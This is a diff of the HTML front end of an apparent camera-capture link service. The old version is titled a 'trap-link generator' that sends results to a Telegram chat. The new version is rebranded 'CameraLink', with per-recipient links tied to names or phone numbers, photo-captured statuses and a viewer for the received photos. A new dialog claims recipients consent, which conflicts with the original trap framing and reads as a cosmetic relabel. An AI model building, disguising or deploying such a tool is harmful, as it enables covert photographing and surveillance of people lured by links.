@@ -1,41 +1,172 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="ru">
 <head>
-    <title>Link Generator</title>
-    <!-- Стили можешь добавить сам, если не хочешь смотреть на убожество -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#15182b">
+  <title>CameraLink — ссылки</title>
+  <link rel="stylesheet" href="./styles.css">
 </head>
 <body>
-    <h1>Генератор ссылок-ловушек</h1>
-    <form id="generatorForm">
-        <input type="text" id="phone" placeholder="Номер телефона (необязательно)"><br><br>
-        <input type="text" id="comment" placeholder="Комментарий (необязательно)"><br><br>
-        <input type="text" id="chatId" placeholder="ID чата Telegram (обязательно)" required><br><br>
-        <input type="text" id="domain" placeholder="Твой домен на Vercel (например, my-trap.vercel.app)" required><br><br>
-        <button type="submit">Сгенерировать</button>
-    </form>
-    <div id="result"></div>
+  <header class="topbar">
+    <div class="topbar__inner">
+      <a class="brand" href="./index.html" aria-label="CameraLink">
+        <span class="brand__mark" aria-hidden="true"></span>
+        CameraLink
+      </a>
+      <nav class="nav" aria-label="Основная навигация">
+        <a class="nav__link nav__link--active" href="#links">Ссылки</a>
+        <a class="nav__link" href="#groups">Мои группы</a>
+        <a class="nav__link" href="#stats">Статистика</a>
+      </nav>
+      <div class="telegram-state" id="telegramState" title="Проверяем подключение">
+        <span class="telegram-state__dot"></span>
+        <span id="telegramStateText">Проверяем Telegram…</span>
+      </div>
+      <button class="logout-button" id="logoutButton" type="button">Выйти</button>
+    </div>
+  </header>
 
-    <script>
-        document.getElementById('generatorForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const phone = document.getElementById('phone').value;
-            const comment = document.getElementById('comment').value;
-            const chatId = document.getElementById('chatId').value;
-            const domain = document.getElementById('domain').value;
+  <main class="page" id="links">
+    <section class="page-heading">
+      <div>
+        <p class="eyebrow">Управление доступом</p>
+        <h1>Ссылки на камеру</h1>
+        <p class="page-heading__subtitle">Создавайте одноразовые ссылки и отслеживайте их статус.</p>
+      </div>
+      <div class="summary" aria-label="Краткая статистика">
+        <div class="summary__item"><strong id="totalCount">0</strong><span>Всего</span></div>
+        <div class="summary__item"><strong id="openedCount">0</strong><span>Открыто</span></div>
+        <div class="summary__item"><strong id="photoCount">0</strong><span>Фото</span></div>
+      </div>
+    </section>
 
-            const response = await fetch('/api/generate', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, comment, chatId, domain })
-            });
+    <div class="dashboard">
+      <aside class="card create-card">
+        <div class="card__heading">
+          <span class="card__icon" aria-hidden="true">＋</span>
+          <div>
+            <h2>Создать ссылку</h2>
+            <p>Добавьте данные получателя</p>
+          </div>
+        </div>
 
-            const data = await response.json();
-            if(data.link) {
-                document.getElementById('result').innerHTML = `<h3>Готовая ссылка:</h3><input type="text" value="${data.link}" size="50" readonly onclick="this.select()">`;
-            } else {
-                document.getElementById('result').innerText = `Ошибка: ${data.error}`;
-            }
-        });
-    </script>
+        <form id="createLinkForm">
+          <label class="field">
+            <span class="field__label">Имя или телефон <em>*</em></span>
+            <input id="recipient" name="recipient" type="text" autocomplete="off" placeholder="Например, +380 99 123-45-67" required maxlength="80">
+          </label>
+
+          <label class="field">
+            <span class="field__label">Доп. информация</span>
+            <textarea id="note" name="note" rows="5" placeholder="Заметка для себя" maxlength="240"></textarea>
+            <span class="field__hint"><span id="noteCounter">0</span>/240</span>
+          </label>
+
+          <label class="field">
+            <span class="field__label">Группа <em>*</em></span>
+            <select id="group" name="group" required>
+              <option value="Основная группа">Основная группа</option>
+              <option value="Тестовая группа">Тестовая группа</option>
+            </select>
+          </label>
+
+          <label class="field">
+            <span class="field__label">Срок действия</span>
+            <select id="expires" name="expires">
+              <option value="24h">24 часа</option>
+              <option value="3d">3 дня</option>
+              <option value="7d">7 дней</option>
+            </select>
+          </label>
+
+          <button class="button button--primary button--wide" type="submit">
+            <span>Создать ссылку</span>
+            <span aria-hidden="true">→</span>
+          </button>
+        </form>
+      </aside>
+
+      <section class="content-column">
+        <div class="card filters">
+          <label class="field field--compact">
+            <span class="field__label">Статус</span>
+            <select id="statusFilter">
+              <option value="all">Все статусы</option>
+              <option value="created">Создана</option>
+              <option value="opened">Открыта</option>
+              <option value="captured">Фото готово</option>
+              <option value="revoked">Отозвана</option>
+            </select>
+          </label>
+          <label class="field field--compact search-field">
+            <span class="field__label">Поиск</span>
+            <span class="search-field__control">
+              <span class="search-field__icon" aria-hidden="true">⌕</span>
+              <input id="searchInput" type="search" placeholder="Имя, телефон или заметка">
+            </span>
+          </label>
+        </div>
+
+        <div class="card table-card">
+          <div class="table-card__header">
+            <div>
+              <h2>Созданные ссылки</h2>
+              <p id="resultCount">0 записей</p>
+            </div>
+            <button class="button button--ghost" id="clearDemo" type="button">Очистить журнал</button>
+          </div>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Статус</th>
+                  <th>Получатель</th>
+                  <th>Информация</th>
+                  <th>Создана</th>
+                  <th class="table-actions-heading">Действия</th>
+                </tr>
+              </thead>
+              <tbody id="linksTableBody"></tbody>
+            </table>
+            <div class="empty-state" id="emptyState">
+              <div class="empty-state__icon" aria-hidden="true">↗</div>
+              <h3>Ссылок пока нет</h3>
+              <p>Заполните форму слева — новая ссылка появится здесь.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+  <dialog class="link-dialog" id="linkDialog">
+    <button class="dialog-close" type="button" aria-label="Закрыть">×</button>
+    <div class="dialog-success" aria-hidden="true">✓</div>
+    <p class="eyebrow">Ссылка создана</p>
+    <h2>Готово к отправке</h2>
+    <p class="dialog-copy">Получатель увидит предупреждение о съёмке и сам разрешит доступ к камере.</p>
+    <label class="generated-link">
+      <span>Уникальная ссылка</span>
+      <span class="generated-link__row">
+        <input id="generatedLink" readonly>
+        <button id="copyGeneratedLink" type="button">Копировать</button>
+      </span>
+    </label>
+    <a class="button button--primary button--wide" id="openGeneratedLink" href="#" target="_blank" rel="noopener">Открыть страницу камеры</a>
+  </dialog>
+
+  <dialog class="link-dialog photo-dialog" id="photoDialog">
+    <button class="dialog-close photo-dialog-close" type="button" aria-label="Закрыть">×</button>
+    <p class="eyebrow">Полученная фотография</p>
+    <h2 id="photoDialogTitle">Результат</h2>
+    <img id="photoDialogImage" alt="Фотография, полученная по ссылке">
+    <a class="button button--secondary button--wide" id="openPhotoOriginal" href="#" target="_blank" rel="noopener">Открыть оригинал</a>
+  </dialog>
+
+  <script src="./admin-client.js"></script>
 </body>
 </html>
